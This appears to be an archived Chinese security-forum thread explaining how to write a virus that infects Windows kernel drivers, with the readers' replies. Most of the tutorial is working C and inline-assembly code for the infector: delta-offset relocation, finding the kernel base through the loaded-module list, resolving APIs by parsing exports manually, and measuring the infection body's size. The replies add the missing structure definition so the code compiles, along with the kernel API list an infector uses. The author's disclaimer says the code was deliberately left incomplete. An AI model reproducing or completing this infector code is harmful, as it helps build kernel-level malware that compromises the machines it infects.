

# 驱动感染技术扫盲（C 描述）

> 原文：[`www.pediy.com/kssd/pediy09/pediy09-339.htm`](https://www.pediy.com/kssd/pediy09/pediy09-339.htm)

> 驱动感染技术扫盲(C 描述)    
> Writer By 老 Y  
> 上周的上周的....周末有位同学提到过驱动感染问题,而刚好周末也没有地方可去,所以就有了这篇文章的出现.既然是扫盲版,那肯定是没有什么高深的东西了,只是一些奇淫技巧,高手请自动跳过。  
> 好了,回归正题,很多年前(其实也就 4, 5 年,拌一下老人,呵呵)玩 Ring3 下 PE 感染的时候就用过相关的东西,那么我们来想想,一个标准的 PE 感染要解决哪几个问题呢?  
> 1、重定位问题  
> 在汇编里可以很简单的使用下面这种方式来重定位代码或全局数据：  
> Start:  
>     call lbl\_Next  
> lbl\_Next:  
>     pop ebx  
>     sub ebx, 5  
>     sub ebx, offset Start  
>   
> 要访问全局数据就这样：Mov eax, dword ptr\[ebx + GlobalData\]  
> 那么用 C 语言里怎么重定位呢，呵呵，有人说过在 C 里不能嵌汇编吗？没有，嘿，那就用汇编，如：  
> /\*\*  
> \*@brief 取得全局变量或函数重定位后的地址  
> \*   
> \*@param\[in\]    pVar 全局变量或函数的地址  
> \*@return 返回全局变量或函数的实际地址  
> \*/  
> PVOID KGetGlobalVarAddr(PVOID pVar)  
> {  
>   PVOID pCurAddr = NULL;  
>   \_\_asm  
>   {  
> Start:  
>     call lbl\_Next  
> lbl\_Next:  
>     pop eax  
>     sub eax, 5  
>     sub eax, offset Start  
>     add eax, pVar  
>     mov pCurAddr, eax  
>   }  
>   return pCurAddr;  
> }  
>   
> 访问全局数据就成这样：pData = KGetGlobalVarAddr(&GlobalData);  
> 2、引入表问题  
> 得到 ntoskrnl 基址  
> 大家都知道 DriverEntry 函数的第一个参数是一个 DriverObject，该参数的结构如下  
> nt!\_DRIVER\_OBJECT  
>    +0x000 Type             : Int2B  
>    +0x002 Size             : Int2B  
>    +0x004 DeviceObject     : Ptr32 \_DEVICE\_OBJECT  
>    +0x008 Flags            : Uint4B  
>    +0x00c DriverStart      : Ptr32 Void  
>    +0x010 DriverSize       : Uint4B  
>    +0x014 DriverSection    : Ptr32 Void  
>    +0x018 DriverExtension  : Ptr32 \_DRIVER\_EXTENSION  
>    +0x01c DriverName       : \_UNICODE\_STRING  
>    +0x024 HardwareDatabase : Ptr32 \_UNICODE\_STRING  
>    +0x028 FastIoDispatch   : Ptr32 \_FAST\_IO\_DISPATCH  
>    +0x02c DriverInit       : Ptr32      
>    +0x030 DriverStartIo    : Ptr32      
>    +0x034 DriverUnload     : Ptr32      
>    +0x038 MajorFunction    : \[28\] Ptr32      
>   
> 其中 DriverSection 成员指向 LDR\_DATA\_TABLE\_ENTRY 结构，如下：  
> +0x000 InLoadOrderLinks : \_LIST\_ENTRY  
>    +0x008 InMemoryOrderLinks : \_LIST\_ENTRY  
>    +0x010 InInitializationOrderLinks : \_LIST\_ENTRY  
>    +0x018 DllBase          : Ptr32 Void  
>    +0x01c EntryPoint       : Ptr32 Void  
>    +0x020 SizeOfImage      : Uint4B  
>    +0x024 FullDllName      : \_UNICODE\_STRING  
>    +0x02c BaseDllName      : \_UNICODE\_STRING  
>    +0x034 Flags            : Uint4B  
>    +0x038 LoadCount        : Uint2B  
>    +0x03a TlsIndex         : Uint2B  
>    +0x03c HashLinks        : \_LIST\_ENTRY  
>    +0x03c SectionPointer   : Ptr32 Void  
>    +0x040 CheckSum         : Uint4B  
>    +0x044 TimeDateStamp    : Uint4B  
>    +0x044 LoadedImports    : Ptr32 Void  
>    +0x048 EntryPointActivationContext : Ptr32 Void  
>    +0x04c PatchInformation : Ptr32 Void  
>   
> DllBase、SizeOfImage、FullDllName、BaseDllName 等等都是好东西呀，呵呵  
>   
> 通过遍历这张表得到 ntoskrnl 的基址和大小，如下  
>   
> /\*\*  
> \*@brief 根据驱动模块名返回对应的映像基址和映像大小  
> \*   
> \*@param\[in\]    pwszModuleName 驱动模块名  
> \*@param\[in\]    pulModuleSize 返回驱动模块的大小  
>   
> \*@return 返回 0 表示失败,其它值是驱动模块基址  
> \*/  
> ULONG KGetModuleBase(WCHAR \*pwszModuleName, ULONG \*pulModuleSize)  
> {  
>   ULONG ulModuleBase = 0;  
>   LIST\_ENTRY \*Entry = NULL;  
>   LDR\_DATA\_TABLE\_ENTRY \*DataTableEntry = NULL;  
>   PDRIVER\_OBJECT DriverObject = KGetGlobalVarAddr(g\_pDriverObject);  
>   
>   Entry = ((LIST\_ENTRY\*)DriverObject->DriverSection)->Flink;  
>   do  
>   {  
>     DataTableEntry = CONTAINING\_RECORD(Entry,  
>       LDR\_DATA\_TABLE\_ENTRY,  
>       InLoadOrderLinks);  
>     if (DataTableEntry->EntryPoint &&   
>       DataTableEntry->BaseDllName.Buffer &&  
>       DataTableEntry->FullDllName.Buffer &&   
>       DataTableEntry->LoadCount  
>       )  
>     {  
>   
>       if ( !KWcsNiCmp(  
>         DataTableEntry->BaseDllName.Buffer,  
>         pwszModuleName,   
>         DataTableEntry->BaseDllName.Length / sizeof(WCHAR)  
>         )  
>         )  
>       {  
>         ulModuleBase = DataTableEntry->DllBase;  
>         if (pulModuleSize)  
>         {  
>           \*pulModuleSize = DataTableEntry->SizeOfImage;  
>         }  
>         goto Exit0;  
>       }  
>     }  
>   
>     Entry = Entry->Flink;  
>   
>   }  
>   while (Entry != ((LIST\_ENTRY\*)DriverObject->DriverSection)->Flink);  
>   
>   
>   
> Exit0:  
>   
>   return ulModuleBase;  
> }  
> （注：也可以用上面的方法来枚举已经加载的驱动列表）  
>   
>   
> 通过导出表取得函数地址  
>   
> /\*\*  
> \*@brief 根据函数名返回函数对应的 RVA 地址  
> \*   
> \*@param\[in\]    pe PE 对象  
> \*@param\[in\]    Name 导出表内的函数名  
>   
> \*@return 返回表示失败,其它值是函数的 RVA 地址  
> \*/  
> ULONG KPEGetFuncRVAByName(KPELIB \*pe, CHAR \*pszFuncName)  
> {  
>   ULONG FuncRVA = 0;  
>   ULONG \*puFuncNameAddress = 0;  
>   USHORT \*puAddressOfOrd = 0;  
>   ULONG \*puAddressOfFunc = 0;  
>   ULONG i = 0;  
>   USHORT Index = 0;  
>   PUCHAR pFuncName = NULL;  
>   ULONG FuncNameRVA = 0;  
>   
>   
>   PROCESS\_ERROR(pe->pExportEntry);  
>   puFuncNameAddress = (ULONG\*)( pe->pExportEntry->AddressOfNames +  pe->pMap);  
>   puAddressOfOrd = (USHORT\*)( pe->pExportEntry->AddressOfNameOrdinals +  pe->pMap);  
>   puAddressOfFunc = (ULONG\*)( pe->pExportEntry->AddressOfFunctions +  pe->pMap);  
>   for (i = 0; i <  pe->pExportEntry->NumberOfNames; i++)  
>   {  
>     Index = puAddressOfOrd\[i\];  
>   
>     FuncNameRVA = puFuncNameAddress\[i\];  
>     pFuncName = (PUCHAR)( pe->pMap + FuncNameRVA);  
>   
>     if (KStrCmp(pszFuncName, (CHAR\*)pFuncName) == 0)  
>     {  
>       FuncRVA = puAddressOfFunc\[Index\];  
>       break;  
>     }  
>   
>   }  
>   
>   
> Exit0:  
>   return FuncRVA;  
> }  
>   
> /\*\*  
> \*@brief 根据内核映像初始一个 PE 对象  
> \*   
> \*@param\[in\]    Buffer 内核映像基址  
> \*@param\[in\]    uFileSize 内核映像大小  
> \*@param\[out\]  pe PE 对象  
> \*@return 返回 STATUS\_SUCCESS 时成功,其它值为失败  
> \*/  
> int KPEInitFromMem(PUCHAR Buffer, ULONG uFileSize, KPELIB \*pe)  
> {  
>   int    nResult = STATUS\_UNSUCCESSFUL;  
>   
>   if (!pe)  
>   {  
>     goto Exit0;  
>   }  
>   
>   pe->pDosHdr = (PIMAGE\_DOS\_HEADER)Buffer;  
>   pe->pNtHdr = (PIMAGE\_NT\_HEADERS32)(Buffer +  pe->pDosHdr->e\_lfanew);  
>   pe->pSecHdr = (PIMAGE\_SECTION\_HEADER)(  
>     pe->pDosHdr->e\_lfanew +   
>     pe->pNtHdr->FileHeader.SizeOfOptionalHeader +   
>   
>     0x18 + Buffer  
>     );  
>   
>   pe->pExportEntry = (PIMAGE\_EXPORT\_DIRECTORY)(  
>     Buffer +   
>     pe->pNtHdr->OptionalHeader.DataDirectory\[0\].VirtualAddress  
>     );  
>   
>   pe->pImportEntry = (PIMAGE\_IMPORT\_DESCRIPTOR)(  
>     Buffer +   
>     pe->pNtHdr->OptionalHeader.DataDirectory\[1\].VirtualAddress  
>     );  
>   
>   pe->pBaseReloc = (PIMAGE\_BASE\_RELOCATION)(  
>     Buffer +   
>     pe->pNtHdr->OptionalHeader.DataDirectory\[5\].VirtualAddress  
>     );  
>   
>   pe->IsInitSuccessed = TRUE;  
>   pe->pMap = Buffer;  
>   pe->uMapSize = uFileSize;  
>   nResult = STATUS\_SUCCESS;  
> Exit0:  
>   return nResult;  
> }  
>   
> /\*\*  
> \*@brief 根据函数名得到函数的地址,可以理解为 GetProcAddress  
> \*   
> \*@param\[in\]    pwszModuleName 驱动模块名  
> \*@param\[in\]    pszFuncName 函数名  
>   
> \*@return 返回表示失败,其它值是函数的地址  
> \*/  
> ULONG KGetApiAddr(WCHAR \*pwszModuleName, CHAR \*pszFuncName)  
> {  
>   int    nRetCode = FALSE;  
>   ULONG  ulApiAddr = 0;  
>   ULONG  ulNtosBase = 0;  
>   ULONG  ulNtosSize = 0;  
>   KPELIB  pe;  
>   
>     
>   
>   ulNtosBase = KGetModuleBase(KGetGlobalVarAddr(pwszModuleName), &ulNtosSize);  
>   if (!ulNtosBase)  
>   {  
>     goto Exit0;  
>   }  
>   
>   nRetCode = KPEInitFromMem((PUCHAR)ulNtosBase, ulNtosSize, &pe);  
>   if(!NT\_SUCCESS(nRetCode))  
>   {  
>     goto Exit0;  
>   }  
>   
>   ulApiAddr = KPEGetFuncRVAByName(&pe, KGetGlobalVarAddr(pszFuncName));  
>   if (!ulApiAddr)  
>   {  
>     goto Exit0;  
>   }  
>   
>   ulApiAddr += ulNtosBase;  
>   
> Exit0:  
>   
>   return ulApiAddr;  
> }  
> 使用示例：  
> WCHAR g\_Ntoskrnl\[\] = L"ntoskrnl.exe";  
> CHAR  g\_ApiName\[\] = "NtCreateFile";  
> pFunc = KGetApiAddr(  
> KGetGlobalVar(g\_Ntoskrnl),  
> KGetGlobalVar(g\_ApiName)  
>  );  
> 其它的不多说了，大家应该对这块是已经熟得不能再熟了^\_^  
>   
> 3、感染体大小的取得  
>     我的解决方案是：  
>     在所有的代码和数据前面放置 KGetStartAddr 函数  
> /\*\*  
> \*@brief 取得当前函数的地址  
> \*   
> \*@return 返回当前函数的地址  
> \*/  
> ULONG \_\_declspec(naked) KGetStartAddr()  
> {  
>   \_\_asm  
>   {  
>     call lbl\_Next  
> lbl\_Next:  
>     pop eax  
>     sub eax, 5  
>     ret  
>   }  
> }  
> 在所有的代码和数据前面放置 KGetEndAddr 函数  
>   
> /\*\*  
> \*@brief 取得当前函数末的地址  
> \*   
> \*@return 返回前函数末的地址  
> \*/  
> ULONG \_\_declspec(naked) KGetEndAddr()  
> {  
>   \_\_asm  
>   {  
>     call lbl\_Next  
> lbl\_Next:  
>     pop eax  
>     add eax, 5  
>     ret  
>   }  
> }  
>   
> 感染体大小= KGetEndAddr() - KGetStartAddr()  
>   
> 4、把.data 节和.text 节合并  
> 方法：  
>   把 VC2005 的工程属性 Linker->Advanced->Merge Sections 字段改成.data=.text  
>   
> 5、重新计算文件 CheckSum，对于驱动来说，这个很重要，不重新计算驱动会加载失败  
> 从 2000 源代码里 A 出来的，具体看源代码  
> 6、记不起来了，具体看源代码,自己慢慢调，慢慢蓝，嘿  
>   
>   
> 声明：  
> 本文的目的不是在教大家怎么写驱动感染病毒，纯粹是一种技术交流，使用本文所演示的技术所造成的一切影响都与本人无关。  
>   
>   
> 源代码说明:  
> 代码被我删除了一些东西，所以不要问我怎么编译通不过，懂得相关技术的人自然很容易补齐，这也是为了防止有人直接 A 过去干坏事^\_^ 

> 问下老 Y：  
>   
> 偶把代码修补了半天。编译只剩下一个错误，不知道是怎么回事啊：  
>   
> 
> 引用:
> 
> | 
> 
> * * *
> 
>  error C4296: '>=' : expression is always true 
> 
> * * *
> 
>  |
> | --- |
> 
> 也就是在自己实现内存操作的那些函数里面的判断：  
>   
> VOID KWcsUpper(WCHAR \*Str, ULONG ulSize)  
> {  
>   if (ulSize)  
>   {  
>     ulSize = ulSize / sizeof(WCHAR);  
>   
>     while (ulSize)  
>     {  
>       if (\*Str >= L'a' && \*Str <= L'z')  
>       {  
>         \*Str -= 0x20;  
>       }  
>       Str++;  
>       ulSize --;  
>   
>     }  
>   }  
>   else  
>   {  
>     while (\*Str)  
>     {  
>       if (\*Str **\>=** L'a' && \*Str <= L'z')  
>       {  
>         \*Str -= 0x20;  
>       }  
>       Str++;  
>     }  
>   
>   }  
> }  
>   
> 啥原因啊？ 

> 哈哈。LS 的给的这个和原代码不匹配。你误解人家的意思了。人家不是不知道 PE 结构（PE 结构在 SDK 头文件里就有）而是说楼主的代码里自己定义的这个\_KPELIB 结构没有帖出来。需要自己去完善。![](img/7c79845954f5fbf9e981f570ed213a8d.jpg "扮鬼脸")   
>   
> 偶来个完整的。而且编译通过。  
>   
> 
> 代码:
> 
> * * *
> 
> `typedef struct _KPELIB {     PIMAGE_DOS_HEADER         pDosHdr;     PIMAGE_NT_HEADERS32       pNtHdr;     PIMAGE_SECTION_HEADER     pSecHdr;     PIMAGE_EXPORT_DIRECTORY   pExportEntry;     PIMAGE_IMPORT_DESCRIPTOR  pImportEntry;     PIMAGE_BASE_RELOCATION    pBaseReloc;     BOOLEAN                   IsInitSuccessed;     PUCHAR                    pMap;     ULONG                     uMapSize;      HANDLE                    hFile;   } KPELIB, *PKPELIB;`
> 
> * * *
> 
> ![](img/9e827a3de2ad55eed0f95082425861b2.jpg "微笑")

> CHAR g\_szFuncName\[defApiNum\]\[80\] =   
> {  
>   "IoCreateFile",  
>   "ZwClose",  
>   "ExAllocatePoolWithTag",  
>   "ZwReadFile",  
>   "ZwWriteFile",  
>   "ZwSetInformationFile",  
>   "ZwQueryInformationFile",  
>   "ExFreePoolWithTag",  
>   "DbgPrint",  
>   "RtlInitUnicodeString",  
>   "PsCreateSystemThread",  
>   "KeDelayExecutionThread"  
> };  
> 这样子比较好~~，不用 xx 掉 premode 

> 很容易搞好的说~~哈哈哈，如果用上我以前的一个东西就更稳定拉拉~  
>   
> 上传 idb 文件~ 

 4dd466d0e1e0cc123afbe504da2462ca